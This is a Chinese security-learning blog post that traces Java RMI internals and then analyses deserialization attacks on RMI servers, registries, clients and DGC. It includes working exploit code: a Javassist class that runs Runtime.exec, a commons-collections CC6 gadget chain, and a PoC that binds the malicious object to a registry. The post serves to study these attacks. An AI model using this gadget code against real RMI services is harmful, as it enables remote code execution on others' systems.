这个类的，UnicastRemoteObject用JRMP协议来export远程对象，并获取与远程对象进行通信的stub，具体是什么意思呢？我们看具体代码实现\n首次实现初始化的时候，它会事先把port变量赋值好，然后直接调用exportObjectexportObject的内容是创建一个UnicastServerRef对象，然后调用其exportObject方法这一段首先是trycatch块中的内容，它先是调用了sun.rmi.server.Util#createProxy()创建了一个代理类先是获取到了我们想要创建的远程对象类，然后进入一个if-else的判断，这里的话我们首先要回忆一下什么是Stub？Stub其实就是用来实现网络通信的动态代理类。if块里面创建的Stub是它RMI包中自带的功能Stub，并非我们自己想创建的Stub，这里自定Stub是在else里面的内容。RemoteObjectInvocationHandler来为RemoteObject实现RemoteInterface接口创建动态代理，真正实现Stub的功能之后返回这个自定义Stub\n然后创建一个Target对象，这个Target对象封装了我们的远程执行方法，和刚才生成的动态代理类然后调用LiveRef的exportObject，这个LiveRef是UnicastRef（UnicastServerRef的父类）自带的成员属性 LiveRef这个exportObject调用到了TCPEndpoint的exportObject方法这里主要干了两件事：首先是对本地端口进行了监听，然后就是调用父类的exportObject，将我们刚才生成的Target 注册进ObjectTable中，这个ObjectTable用来管理所有发布的服务实例 Target，ObjectTable根据 ObjectEndpoint和Remote实例两种方法来查找Target的方法上述流程可以用图来总结一下：\n流程下来比较感兴趣的是InvocationHandler动态代理的部分，它继承了RemoteObject实现了InvocationHandler，那么它一定是一个可序列化并且可以通过 RMI 进行远程传输的动态代理类，既然是动态代理类，自然关注其 invoke 方法三层判断，首先判断是不是代理类，如果不是就直接 throw 走了，然后判断了一下是否是 Object，如果是直接调用 invokeObjectMethod，然后判断是否是 RemoteObject，如果是就直接调用 invokeRemoteMethod 方法。实际上我们跟进invokeRemoteMethod 方法，它的 invoke 调用的是 RemoteRef 的 invoke 方法，RemoteRef 的 invoke 方法这里面的 invoke 方法经由 UnicastRef 实现，这里的内容主要是通过调用 LiveRef 中 Endpoint、Channel  相关方法来进行连接，获取到序列化数据（Var7 获取远程数据流， 进行一系列处理，最终获取到符合格式的序列化数据），之后调用 UnmarshaValue 来进行反序列化调的还是原生的反序列化到这里就是一处可利用点了，我们知道了在远程对象创建的时候，创建的远程代理类中的 invoke 方法会存在反序列化的点，最终 Sink 的地方是在 UnicastRef 的 invoke-&gt;unmarshalValue 方法\n0x02 注册中心创建注册中心的创建就是一个方法了LocateRegistry._createRegistry_(1099);所以我们跟进 createRegistry 方法，看看它到底具体干了些什么首先是实例化 Registry 接口的的实现类 RegistryImpl，继续跟进他的实例化方法干了三件事：1.实例化创建 LiveRef 类，2.实例化创建 UnicastServerRef 类，3.用 setup 方法将两者进行配置**LiveRef** 主要是用来进行网络通信，获取信息和传递信息 **UnicastServerRef** 就是对与整个 RMI 传输信息流进行处理，算是一个 RMI 具体功能的实现类而在 setup 方法中，依旧是调用 UnicastServerRef 的 exportObject 方法将远程对象给发布出去\n但是这次的 exportObject 方法的流程有所不同重要的还是 createProxy 方法，我们跟进在创建 RegistryImpl 远程对象的动态代理类的时候，我们看第一个 if 的内容，var2 和 ingnoreStubClasses 的内容暂且不谈，只看方法 stubClassExists 的内容由于 var0 此时是我们传进来的 RegistryImpl，它会在本地查找 RegistryImpl_Stub 到底有没有这个类，答案是肯定有的\n由于是常见功能类，并且是 RMI 自带的一个部分， RegistryImpl_Stub 的本地类早已经被定义好了这里找到之后会 return 一个 true，那我们的 if 判断的内容就进去了进入这个 createStub，这里预知都能猜到应该就是直接 create 我们刚才检测得到的 RegistryImpl_Stub 了直接反射调用即完成，我们可以看看 RegistryImpl_Stub 的大致结构它完成了大部分的 Registry 注册中心应该完成的功能，且全部都是用反序列化的操作来完成的，就比如说 bind 方法，就是直接把远程对象的序列化数据绑定上去小插曲，我们回到主线，返回的是一个 RemoteStub 类型的对象，不想我们之前发布自定义远程对象，返回的是 Remote 类型，这里也是由于返回的是 RemoteStub 对象，后面会进入创建 Skel 的方法直接一路调用过来到 Util 的 createSkeleton 方法发现其实就是获取到了 RegistryImpl_Skel 类名（本地肯定是存了的），然后进行反射调用，返回出去之后会被分配到 UnicastServerRef 的 this.skel中但是 RegistryImpl_Skel 中的 dispatch 方法它定了各项分发操作的具体内容，功能的实现也是通过序列化和反序列化实现的\n之后的流程就是封装 Target 了，用来网络通信功能的 LiveRef，以及用来远程功能的 RegistryImpl_Stub 对象然后调用 Target 的 exportObject 对象将其发布出去，之后的发布内容流程相似，不重复注册中心的流程停在，思考一下刚才创建流程时有哪些攻击点？\n\n创建动态代理的时候，得到的是本地的 RegistryImpl_Srub?它的每个方法都是通过序列化和反序列化结合才得到的2.创建的 RegistryImpl_Skel 的 dispatch 功能是通过序列化和反序列化实现的\n\n服务端该实现的几个基本功能点都实现完了，就是远程对象和远程服务中心，我们通过比较这两者的流程不难发现其实两者都必须通过创建远程代理对象来封装网络通信功能，最终都有一个 Target 对象，只不过里面封装的功能类的名称不一样，且具体功能也都有差异，因此创建流程也有所差异\n接下来我们来分析注册中心是如何对远程对象进行操作的\n2.注册中心服务功能总计 5 个方法：bind，rebind，lookup，list，unbind，都是对远程对象进行使用首先先看 bind 方法\n0x01 服务注册-bind我们通过服务端调用Naming的 bind 方法，调用到了 RegistryImpl 的 bind 方法这里的逻辑是，通过 bindings 这个 hashtable 类型的变量获取本地的远程对象，看看是否本地进行了存储，如果没有就直接调用 put，将我们刚才创建的远程对象给 put 进去。如果有，就 throw 一个报错。不论你的注册中心和服务端在不在同一端的时候，下面这段方法流程是一样的，都是通过 LocateRegistry.getRegistry()来获取到注册中心，到具体的 getRegistry 内容如下：这里前面会获取一下我们想要的服务中心的 host，然后再来调用 getRegistry 方法。主要逻辑是：处理 host，然后实现功能类 LiveRef （网络通信），然后依然是将其封装进 UnicastRef，最终再放进 Util 的创建动态代理类的 createPorxy ，建一个新的动态代理类，return 出去之后调用这个动态代理类的 bind那在不在同一端的区别在哪呢？我们看看 bind 方法到底有哪些方法实现了这里对我们来说接触到的就是 RegistryImpl 和 RegistryImpl_Stub,我们上面分析过，假如说我们本地注册中心和服务端同时实现，本地缓存是有RegistryImpl_Stub 这个类的，所以我们主要区别就在最后 Util 的 createProxy 中，产生的结果就是：在同一端，直接调用 RegistryImpl ，不在同一端，调用RegistryImpl_Stub，那我们来看看两者的 bind 有啥区别RegistryImpl_Stub：\nRegistryImpl：你会发现如果按照它们本来定义的内容，如果是本地同一端的RegistryImpl，它直接就从本地取了，不会说是还要像RegistryImpl_Stub通过序列化获取对象数据，调用 RemoteObjectInvocationHandler 动态代理的 invoke，触发反序列化操作但实际上不论你注册中心和服务端在不在同一端，统一还是走RegistryImpl_Stub 的一系列的注册中心方法，这里我举个例子，比如说此时的服务端这么写，模拟服务端和注册中心在同一端然后我们跳过创建的过程，直接看到底调用的是 RegistryImpl 还是RegistryImpl_Stub发现还是RegistryImpl_Stub，因为它获取注册中心的方法 getRegistry 调的是各自本地的**LocateRegistry**的getRegistry，各自本地都会存RegistryImpl_Stub 类，所以最终创建出来的都是RegistryImpl_Stub，比较粗暴（这里思考卡了好久。。。）所以关于服务端要调用 bind 功能的逻辑，只需记住一句话：获取到远程注册中心功能类RegistryImpl（实际上是RegistryImpl_Stub），调用其对应的 bind 方法，完成远程对象绑定\n那么**RegistryImpl_Stub **中的 bind 方法具体内容如何？我们上面初探了一下，大致是通过序列化写入相对应的对象序列化数据，之后就是调用 invoke 方法这里具体的调用 UnicastRef 的 invoke 方法还有细节可以深挖我们跟进到 UnicastRef 的 invoke 方法的重要部分它这里操作是将原始类替换为了动态代理类上述的过程是服务端用 Naming 去实现 bind 功能前后的内容，一句话总结就是获取到注册中心（这里以服务端和注册中心不在同一端为例），然后调用其注册中心功能实现类的 bind 方法向注册中心写入序列化数据，然后生成动态代理类。\n\nserver 端调用LocateRegistry.getRegistry()开始获取注册中心\n在本地创建一个 包含了具体通信地址、端口的 RegistryImpl_Stub 对象\n通过调用这个本地的 RegistryImpl_Stub 对象的 bind&#x2F;list… 等方法，来与 Registry 端进行通信  \nRegistryImpl_Stub 的每个方法，都实际上调用了 RemoteRef 的 invoke 方法，进行了一次远程调用链接，向注册中心写入序列化数据\n\n值得注意的是，在调用 invoke 的时候一般都是通过序列化和反序列化来实现数据传输的下面就是看注册中心对这些序列化数据如何处理了，所以接下来我们跟进到注册中心的逻辑，具体入口点下图：注册中心通过 sun.rmi.transport.tcp.TCPTransport#handleMessages来处理请求，并且调用serviceCal方法来处理serviceCall首先是获取到 HashTable 里面的 Target 和 UnicastServerRef，然后再调用 UnicastServerRef  的 dispatch 方法，这里跟进 dispatch 方法dispatch 方法我们之前只在 Skel（服务器骨架）中见过，其实根据它的翻译就能够大致了解它的用法：判断我们是要调用服务中心的哪个方法，然后分别给出具体的逻辑执行回到 UnicastServerRef 本身的 dispatch 内容，它的主要逻辑是获取输入流，然后判断 skel 全局变量是否存在，我们回顾之前在远程对象和注册中心的创建时，如果是注册中心的代理类 create，它在创建完代理类之后会有一个如下的判断意思就是如果我们当前是注册中心在创建动态代理类的话，就会给当前的 skel 变量赋值所以上面的判断是在判断当前进程是服务端还是注册中心，那我们当前流程是注册中心在走，所以调用 OldDispatch 方法oldDispatch 方法的内容前半段差不多，进行一些数据流获取和日志写入，这里还涉及到 DGCImpl 的内容，但是我们现在不跟进，之后再走。最终调用 skel.dispatch 方法，也就是 RegistryImpl_Skel 的 dispatch 方法在RegistryImpl_Skel 的 dispatch 中会根据数据流中写入的操作类型不同调用不同的逻辑，例如 0 就是代表 bind ，它的内容是从流中获取到对应数据，然后进行反序列化，然后调用 RegistryImpl（相对于RegistryImpl_Stub，是本地注册中心功能的实现类） 的 bind 方法上面就是 调用 bind 方法时，注册中心和服务端各自干的事情了，其他的关于服务端和注册中心之间的方法-rebind 等，都可以参照这个流程\n0x02 服务寻找-lookuplookup 就是指客户端对注册中心的调用，寻找指定的远程对象了，这里其实跟 bind 方法的流程有很多相似的地方，客户端和服务端差不多，同样都是先获取到注册中心，当然这里也同样调用 LocateRegistry._getRegistry_来获取，之后就是调用注册中心 RegistryImpl_Stub 的 lookup 方法了首先是将 name 名序列化，然后将序列化数据传入数据流，之后调用 UnicastRef 的 invoke 方法与注册中心端实现网络通信，流程与之前无异看 registry 端处理的逻辑，在 registryImpl_Skel 的 dispatch 中，lookup 的情况是 case 2case2 这里的逻辑是将我们刚才的 name 名序列化数据反序列化，然后调用本地 registryImpl 的 lookup，接受返回结果之后再序列化将其写入数据流，然后返回给客户端\n0x03 远程方法调用client 客户端拿到 Registry 端返回的动态代理对象并且反序列化之后，下一步是调用这个远程对象的具体方法，看上去是本地调用，但接受到的远程代理对象是委托 RemoteRef 的 invoke 方法进行网络通信的，所以现在的 client 端是在直接和 server 端进行交互的，我们待会调用的时候也是直接服务端调用服务端通过 UnicastServerRef 的 dispatch 来处理客户端的请求信息主要逻辑如下：首先获取数据流，然后在 hashToMethod_Map 中查找要执行方法的 hash 值对应的方法如果找到了就会过 if 判断，打日志，之后反序列化参数，反射调用，invoke 与客户端通信将结果返回去其实远程对象定位，然后调用远程对象方法流程只有后续的方法调用的逻辑不同，前面的寻找注册中心，以及中间的网络通信的逻辑都是大差不差的，所以我们分析 RMI 的流程可以分为 3 个大的部分：1.远程对象的创建 2.服务端对注册中心 3. 客户端对注册中心\n原理流程总结上面其实有很多问题可能当时没有解决，或者压根就没提，这里我码一下：1.为什么会在远程对象创建的时候出现了 Stub 的初始化？答：这里要讲明一点，Stub 是在 Server 端创建好之后，传输给 Registry，Client 再获取到的，具体逻辑见客户端getRegistry获取注册中心\n这里我想存一下 SU18 师傅的图片总结，总结的很精辟到位我个人将上图划分：\n\n远程对象的创建 \n注册中心的创建\n获取到注册中心\n从注册中心绑定、获取远程对象\n远程调用\n\n网络通信流程这一部分的内容也是我上面一直没有提到的过程，现在补一下入口点是 UnicastServerRef 的 ref.exprotObject 方法，也就是说我们不论是创建远程对象还是注册中心，都会经过这个步骤这里我们以创建注册中心为例：LocateRegistry.createRegistry(1099); 直接跟进到第一层这里的 ep 是 TCPEndpoint 类，也就是说我们之后跟进的是 TCPEndpoint 的 exportObject 方法TCPEndpoint 的下一层是 TCPTransport 的 exportObject 方法继续跟进到这才算是真正实现网络通信的地方，也就是 listen 方法listen 中的逻辑是先获取到 Endpoint，也就是我们需要发布出去的 Object 源地址，包括 host 以及端口信息，然后的 try-catch 块中是先新建一个 Socket 等待后续的连接，然后新建一个线程，如果接收到了连接的请求，就执行线程中的内容，我们继续跟进 New ThreadAction()中的 new AcceptLoop 的内容run 里面继续跟进 executeAcceptLoop()这里的内容就比较多了，他关键的一个步骤是会随机给我们发布出去的源地址分配一个端口号，这也是实现远程对象和注册中心（制定了端口就不会）的基本表现形式，也就是随机分配到一个端口上，能够访问到这里全部执行完毕之后，我们的会多一个变量 port，如果这里是远程对象的发布，他会随机，但是我们这里跟进指定端口的注册中心的发布，所以是固定的 1099发布成功之后就是将我们当前封装的 Target 存入一个 HashTable 中，因为之后的服务实现都必须要有网络代理类和相应的功能类，Target 中就封装了这些东西，到时候实现功能的时候的就是根据其键值来取\n然后后面的流程就是服务端处理经由注册中心之手接收到的客户端发送过来的请求信息了，过程就不重复了还有一个客户端通过 localRegistry 的 getRegistry 方法创建 Stub 的流程，这里简略记录一下：新开一个线程，开放一个网络端口的监听，接受到请求之后，会自动往下走线程的 Run 方法，里面调用了 Skel 的 dispatch，然后才能走服务端的处理逻辑，只不过这个 dispatch 进不去，只能静态调用\n3.RMI 攻击流程分析请注意，自 jdk8u121 之后单独关于 RMI 的漏洞攻击都基本修复完毕了，一般是与后面复习的漏洞进行组合拳攻击其次，RMI 三端其实都存在相互攻击的可能，并且我个人感觉可以衍生出更多的方面，比如反制之类，这里仅讨论 RMI Client 对 Server 端，Client 对 Registry 端，Client 本身进行记录和 note\n上面铺垫了一些基础知识，主要是 RMI 三个部分：客户端 注册中心 服务端的通信，以及各自的功能实现。 简单一点，其实就只有 Registry 端，以及使用 Registry 端的地方，因为 Registry 端本身的功能只负责传递和引用，相当于数据的中转站，它自己并没有任何的实际调用，所以我们才对注册服务的一端叫做服务端，使用服务的叫做客户端还有一点，我们上面流程中，我们调用功能（bind，lookup 等）时，一个环节的结束，总是伴随着 writeObject，将结果的序列化数据写入数据流，整个过程的数据传输都是通过序列化数据实现的，那也就是说，我们三端都是存在攻击可能的首先先看 Server 端\n0x01 攻击对象为 Server1x01 恶意参数攻击该项攻击的前提是目标服务器上存在 CC 依赖或者 CB 依赖才能够进一步攻击扩展如果是 Client 端对 Server 端进行攻击，单指远程方法调用这一块，可以回顾 2-0x03 段的内容，这里的重点是客户端传入的远程调用方法的参数进行反序列化，最终利用点在 UnicastServerRef 的 dispatch 方法的下面部分的代码， unmarshalValue 会对参数进行反序列化所以这里我们可以传入恶意序列化数据，比如说 CC6 或者 CC11 等都是可以的这里结合一下 Javassist 复习，写一个更加 恶意类更短的 CC6先写恶意类的字节码\njavaimport javassist.*;\n\npublic class EvilClassWrite &#123;\n    public static byte[] GetShortTemplatesImpl(String cmd) &#123;\n\n        try &#123;\n            ClassPool pool = ClassPool.getDefault();\n            CtClass ctClass = pool.makeClass(&quot;Evil&quot;);\n            CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n            ctClass.setSuperclass(superClass);\n            CtConstructor constructor = ctClass.makeClassInitializer();\n            constructor.setBody(&quot;        try &#123;\\n&quot; +\n                    &quot;            Runtime.getRuntime().exec(\\&quot;&quot; + cmd + &quot;\\&quot;);\\n&quot; +\n                    &quot;        &#125; catch (Exception ignored) &#123;\\n&quot; +\n                    &quot;        &#125;&quot;);\n            CtMethod ctMethod1 = CtMethod.make(&quot;    public void transform(&quot; +\n                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) &#123;\\n&quot; +\n                    &quot;    &#125;&quot;, ctClass);\n            ctClass.addMethod(ctMethod1);\n            CtMethod ctMethod2 = CtMethod.make(&quot;    public void transform(&quot; +\n                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) &#123;\\n&quot; +\n                    &quot;    &#125;&quot;, ctClass);\n            ctClass.addMethod(ctMethod2);\n            byte[] bytes = ctClass.toBytecode();\n            ctClass.defrost();\n            return bytes;\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n            return new byte[]&#123;&#125;;\n        &#125;\n\n    &#125;\n&#125;然后用最基本的 TemplateImpl 的 CC6，不过这里返回的是 HashMap 的对象，因为利用点— RMI 远程方法调用的参数首先会被 Stub 序列化，再传入 Server 端进行反序列化，省去了我们自己序列化的过程\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.*;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\npublic class EvilClass &#123;\n    public static Object getEvil() throws Exception &#123;\n        TemplatesImpl templates=new TemplatesImpl();\n        Class tc=templates.getClass();\n        Field nameFiled=tc.getDeclaredField(&quot;_name&quot;);\n        nameFiled.setAccessible(true);\n        nameFiled.set(templates,&quot;aaa&quot;);\n\n        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodesField.setAccessible(true);\n        byte[] code= new EvilClassWrite().GetShortTemplatesImpl(&quot;calc&quot;);\n        byte[][] codes=&#123;code&#125;;\n        bytecodesField.set(templates,codes);\n\n\n        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);\n        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();\n        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,new ConstantTransformer(1));\n\n        TiedMapEntry tiedMapeEntry=new TiedMapEntry(lazymap,templates);\n\n        HashMap&lt;Object,Object&gt; map2= new HashMap&lt;&gt;();\n        map2.put(tiedMapeEntry,&quot;bbb&quot;);\n        lazymap.remove(templates);\n\n        Class c=LazyMap.class;\n        Field factoryField=c.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);\n        factoryField.set(lazymap,invokerTransformer);\n        return map2;\n    &#125;\n\n&#125;然后开启 Server ，用 Cilent 去打这种情况是只存在于我们攻击的参数类型为 Object 时才会成功，那假如说服务端设定的参数不是 Object，而是我们不知道的一个的参数类型呢？假如说我们现在服务端所定义的远程对象所接受的参数类型为 HelloObject然后我们客户端再打很明显是不行的，具体报错如下精确一点，这个报错是在说服务端无法找到对应的方法，因为我们所有的方法都是从 UnicastServerRef  的this.hashToMethod_Map通过哈希键值对应得，而我们现在传过去的参数类型是 Object，与 HelloObject 的哈希值肯定不相等，所以不能成功调用，进入反序列化的过程那么肯定是在服务端调用之前就被拦截了，具体 Hook 的点呢，是在RemoteObjectInvocationHandler，整个客户端调到服务端的远程对象都是通过 Stub 远程代理类来做的，我们当时创建 Proxy 代理类的时候也是创建的，所以当我们的客户端与服务端通信的时候，都会经过相对应的代理方法走一遍真正对 hash 值做处理的是在RemoteObjectInvocationHandler的invokeRemoteMethod中，getMethodHash 方法对我们的 method 进行了 hash 算取，这里就有很多可以操作的点了\n\n通过网络代理，在流量层修改数据\n自定义 “java.rmi” 包的代码，自行实现\n字节码修改\n使用 debugger\n\n这里最简单的是直接 debugger 就行，调试的时候将类型改为 HelloObject，算取的 hash 就能够对应上了，其他方法还未复现，这里就不码了https://www.anquanke.com/post/id/200860https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg感兴趣的师傅可以看看上面这两篇文章，高版本之后的很多防御点都是通过修改RemoteObjectInvocationHandler 实现的\n1x02 动态类加载之前讨论过，RMI 还存一种从指定 codebase 中加载任意类的功能，具体一点就是当 Client 端传入在 Server 端 ClassPath 找不到的类时，RMI 就会从另外一个指定的地方寻找，并加载但是也有条件，并不是说默认开启的。1.Server 端必须加载和配置好 SecurityManager，2.java.rmi.server.useCodebaseOnly=false必须开启 3.版本必须是 6u45&#x2F;7u21  之前具体的代码，我们还是从服务端的 UnicastServerRef 的 dispatch 看依然还是反序列化参数的过程，我们进到默认的参数反序列化方法这里的参数 var1 是我们指定的方法名，var2 则是 MarshalInputStream当我们继续跟进 unmarshalValue 的时候，他调用的是 MarshalInputStream\n\n待会反序列化的时候会调用 resolveClass 方法这里的逻辑：首先调用 readLocation ，获取到 Codebase 的地址，然后获取到我们想要反序列化的类名，之后检测一下useCodebaseOnly是否开启然后就开始调用 RMIClassLoader的 loadClass 方法，跟进这里的话需要一直跟进到sun.rmi.server.LoaderHandler的 loadClassForName通过 Class.forName 来实现类加载，这里传入了自定的类加载器LoaderHandler$Loader而这里的 Loader 也是 URLClassLoader 的子类不论是 Client 端还是 Server 端，两端只要有一段配置了 java.rmi.server.codebase 那么 Client 就能够通过这个参数传递 Server 端不存在的类，pushServer 端去恶意 codebase 加载恶意类了\n0x02 攻击对象为 Registry1x01 客户端攻击 Registry先看客户端，很明显的就是直接 lookup，然后经由注册中心的 RegistryImpl_Skel 的 dispatch 方法中关于 lookup 的处理逻辑那么这里的反序列化的啥呢？是我们 lookup 参数中传入的指定远程对象的名称就比如说这里的 Hello那我们可以将序列化数据传入 lookup 的参数，只需注意这里必须是字符串参数才能接受\n1x02 Server 攻击 RegistryServer 端与注册中心有很多交互的可能，bind rebind 等，回顾一下服务端对注册中心交互的流程，获取到注册中心对象，创建了 Stub 动态代理对象，给 Registry 端发送了信息，新线程开启，并且开始调入 UnicastServerRef 的 dispatch 方法，又由于此时是在注册中心端处理的逻辑，进入 olddispatch，调用 RegistryImpl_Skel 的 dispatch （可以往 2-2-0x01 复习一下流程）有两处的反序列化操作，一个是绑定的键—-var7，一个是绑定的我们传入的远程对象，第一个是 String 类型，没有利用可能，只能看第二个参数的反序列化，必须继承自 Remote 接口，之后就可以直接打 CC 等实现的话我们直接用 AnnotationInvocationHandler 来代理了 Remote 接口  即可代码实现可以参考如下\njavaimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.registry.LocateRegistry;\nimport java.util.HashMap;\nimport  java.rmi.registry.*;\n\n\npublic class POCtest &#123;\n    public static void main(String[] args) throws Exception &#123;\n        LocateRegistry.createRegistry(1099);\n        Registry registry= (Registry) LocateRegistry.getRegistry(&quot;localhost&quot;,1099);\n        Class&lt;?&gt; c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n        Constructor&lt;?&gt; constructor=c.getDeclaredConstructors()[0];\n        constructor.setAccessible(true);\n\n        HashMap&lt;String,Object&gt; map=new HashMap&lt;&gt;();\n        map.put(&quot;a&quot;,new EvilClass().getEvil());\n\n        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,map);\n        Remote remote= (Remote)  Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),\n                new Class[]&#123;Remote.class&#125;,invocationHandler);\n\n        Naming.bind(&quot;a&quot;,remote);\n    &#125;\n&#125;这里的获取 CC6 的 hashmap 是通过new EvilClass().getEvil()实现的，与上面客户端攻击 Registry 的获取恶意对象是一样的代码，这里的处理方式不同，因为我们传入的恶意类必须是  Remote 类型  ，那就靠 AnnotationInvocationHandler  来 代理 Remote 接口满足要求然后就是把申请完代理类之后的恶意类传入 bind 的第二个参数即可实际上，当我们在 RegistryImpl_Skel 中查看每个方法的处理逻辑，不止 bind 方法一处直接 readObject 了，包括 bind rebind 等等方法的攻击方式都是大同小异的请注意：攻击 Registry 端是存在 JDK 版本限制的，这里可以去看看白日梦组长 RMI 的视频，讲的很详细\n0x03 攻击对象为 Client我个人理解，常用于反制手段，因为刚才我们上面对于 Registry 端或者 Server 端都是首先考虑 Client 端发起攻击，也确实符合逻辑和实际情况，那既然三者之间的信息传输都是通过序列化和反序列化实现的，那就存在互相攻击的可能，Client 端同样之前只提到过一点，就是客户端远程调用之后，服务端将序列化结果给传输到 Client 端的 Stub，然后进行反序列化进行结果的提取具体调用逻辑与之前分析的相同，因为是动态代理类，直接进 Handler 的 invokeRemoteMethod 方法然后进 UnicastRef 的 invoke 方法将序列化数据传输给服务端经过处理后，会接受其结果，然后 UnmarShalValue 走一遍反序列化其结果实现起来其实不太现实，一般情况要打 Client 也是将其看作 Server 端镜像着打，那么攻击方式也就是 Server 端攻击一样了\n0x04 攻击对象为 DGCDGC 是什么呢？中文翻译为分布式垃圾回收– Distributed Garbage Collection  ，之前确实遇到过 DGCImpl 的创建过程，但是我们那个时候没有跟进流程，那他具体是用来干什么的呢？当我们 Server 端给 Client 返回一个远程对象供使用的时候，他会跟踪这个远程对象的调用，如果这个远程对象没有进一步的被调用，那么 Server 端 将会启用垃圾回收远程对象，每开启一个 RMI 服务，一定会伴随着 DGC 服务端的启动我们看看具体的实现功能类和接口首先是 java.rmi.dgc.DGC 接口,他只有两个方法，dirty 与 clean 方法\n\n当客户端使用 Server 端的远程对象的时候，我们使用 dirty 来注册一个\n当客户端不再使用远程对象时，就会调用 clean 来清除这个远程对象\n\n他有两个实现类，一个是 DGCImpl，一个 DGCImpl_Stub这里可能查找出来只有这两个，但其实还有一个 DGCImpl_Skel它并没有继承自 DGC 这个接口，而是实现自 Skelton 接口那 DGC 是什么时候创建的呢？服务端在创建远程对象的时候，流程走到创建完集成类 UnicastServerRef 之后，开始调用它的 exportObject 方法，一直走到 TCPTransport 的 exportObject 方法这里前面的流程就不讲了，看 try 块中的 super.exportObject 方法跟进上面 setExportedTransport 就不看了，跟进到 putTarget 方法这里有一个 if 判断的内容，调用了 DGCImpl 的 dgclog 静态变量，之前有了解过，当调用一个类的静态变量时，他会自动完成类的实例化，我们跟进，实例化就不看了，当实例化完成时肯定会调用它的静态代码区这里的创建逻辑有点像注册中心，不仅会创建动态代理的 Stub，还会 set 完 Skel，最后将代理类封装起来成为 Target 类，然后 put 进 ObjectTable 的 hash 键值对表然后再看看具体的Skel重点关注 dispatch两个 case，一个是 clean，一个是 dirty，两者的作用我们上面已经提到了，我们只看关于两者是否存在可攻击点\n两者其实都存在被攻击的可能\n","slug":"RMIRe0","date":"2024-03-06T09:50:51.000Z","categories_index":"锻刀的理论学习-RMI原理","tags_index":"锻刀","author_index":"stoocea"}]